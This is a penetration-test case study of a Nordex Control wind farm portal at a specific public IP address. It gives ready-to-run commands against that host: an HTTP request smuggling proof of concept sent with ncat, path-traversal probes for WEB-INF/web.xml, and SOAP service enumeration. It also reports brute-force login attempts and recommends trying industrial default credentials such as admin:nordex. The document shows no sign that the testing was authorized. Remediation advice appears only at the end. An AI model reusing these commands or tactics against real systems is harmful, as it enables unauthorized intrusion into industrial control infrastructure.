# Nordex Control Wind Farm Portal - Pentest Case Study

## Target Information
- **URL**: http://63.142.180.157/13_06_04/index_en.jsp
- **Application**: Nordex Control - Wind Farm Portal v13.06.04 Bear_Creek
- **Server**: Jetty/3.1.8 (Windows 2000 5.0 x86)
- **Java**: 1.6.0_14
- **Servlet**: JSP 1.1; Servlet 2.2

## Reconnaissance Findings

### Technology Stack
```
Server: Jetty/3.1.8 (Windows 2000 5.0 x86)
Servlet-Engine: Jetty/3.1 (JSP 1.1; Servlet 2.2; java 1.6.0_14)
Application: Nordex Control - Wind Farm Portal v13.06.04 Bear_Creek
OS: Windows 2000
```

### Endpoints Discovered
- `/13_06_04/index_en.jsp` - Main login page (English)
- `/13_06_04/index_de.jsp` - Main login page (German)
- `/services` - Apache Axis SOAP services
- `/services/MessageService` - SOAP service (requires auth)
- `/services/ConfigurationService` - SOAP service (xsd:anyType)
- `/login` - Authentication endpoint
- `/redir` - Redirect endpoint
- `/robots.txt` - Robots file
- `/LICENSE` - Apache License

### SOAP Services
```xml
<!-- MessageService WSDL -->
<service name="MessageHandlerProxyService">
  <port binding="impl:MessageServiceSoapBinding" name="MessageService">
    <wsdlsoap:address location="http://63.142.180.157/services/MessageService"/>
  </port>
</service>

<!-- ConfigurationService WSDL -->
<service name="MessageHandlerProxyService">
  <port binding="impl:ConfigurationServiceSoapBinding" name="ConfigurationService">
    <wsdlsoap:address location="http://63.142.180.157/services/ConfigurationService"/>
  </port>
</service>
```

## Vulnerabilities Found

### 1. HTTP Request Smuggling (CL.TE) - Critical

**Discovery Method**: Tested if server accepts both Transfer-Encoding and Content-Length headers

**Proof of Concept**:
```bash
# Smuggled request to /services
echo -ne "POST /login HTTP/1.1\r\nHost: 63.142.180.157\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /services HTTP/1.1\r\nHost: 63.142.180.157\r\n\r\n" | ncat -w5 63.142.180.157 80
```

**Result**: Server processes smuggled request and returns service listing

**Impact**: Can bypass authentication, access internal endpoints

### 2. Path Traversal (Partial) - Medium

**Discovery Method**: Tested encoded slashes and path manipulation

**Proof of Concept**:
```bash
curl -s -o /dev/null -w "%{http_code}" "http://63.142.180.157/13_06_04/%2e%2e/%2e%2e/WEB-INF/web.xml"
# Result: 403 - File exists but access blocked
```

**Impact**: Confirms sensitive files exist, potential for bypass

### 3. Information Disclosure - Low

**Discovery Method**: Checked HTTP headers

**Proof of Concept**:
```bash
curl -sI http://63.142.180.157/13_06_04/index_en.jsp
# Server: Jetty/3.1.8 (Windows 2000 5.0 x86)
# Servlet-Engine: Jetty/3.1 (JSP 1.1; Servlet 2.2; java 1.6.0_14)
```

**Impact**: Helps attackers identify vulnerable software versions

### 4. Missing Security Headers - Low

**Discovery Method**: Checked for common security headers

**Proof of Concept**:
```bash
curl -sI http://63.142.180.157/13_06_04/index_en.jsp | grep -i "strict\|x-frame\|x-content"
# No output - headers missing
```

**Impact**: Susceptible to Clickjacking, MIME sniffing, etc.

### 5. Apache Axis SOAP Services - Information

**Discovery Method**: Enumerated /services endpoint

**Proof of Concept**:
```bash
curl -s http://63.142.180.157/services
# And now... Some Services
# MessageService - parseMessage(xsd:anyType)
# ConfigurationService - parseConfigurationMessage(xsd:anyType)
```

**Impact**: xsd:anyType may be vulnerable to deserialization attacks

## Unsuccessful Tests

| Test | Result | Reason |
|------|--------|--------|
| SQL Injection | Sequential error codes | Counter, not SQL error |
| XXE | DOCTYPE blocked | SOAP parser prevents |
| Java Deserialization | "Unknown task" | Application layer blocks |
| CGIServlet (CVE-2002-1178) | 404 | /cgi-bin doesn't exist |
| Brute Force Login | No creds found | Strong passwords |
| CRLF Injection | HTML-encoded | XSS not possible |
| Axis Admin | 404 | AdminService not deployed |

## Lessons Learned

1. **HTTP Smuggling**: CL.TE works when server accepts both headers
2. **SOAP Enumeration**: Always check /services for WSDL
3. **Path Traversal**: 403 = file exists, 404 = doesn't exist
4. **ICS/SCADA**: Try industrial default creds (admin:nordex, etc.)
5. **Error Codes**: Sequential codes = counter, not injection indicator

## Remediation Recommendations

1. **Upgrade Jetty**: Move to latest stable version
2. **Disable Chunked Transfer**: If not needed
3. **Add Security Headers**: HSTS, X-Frame-Options, CSP
4. **Hide Server Version**: Remove version headers
5. **Restrict SOAP Access**: Require authentication for all services
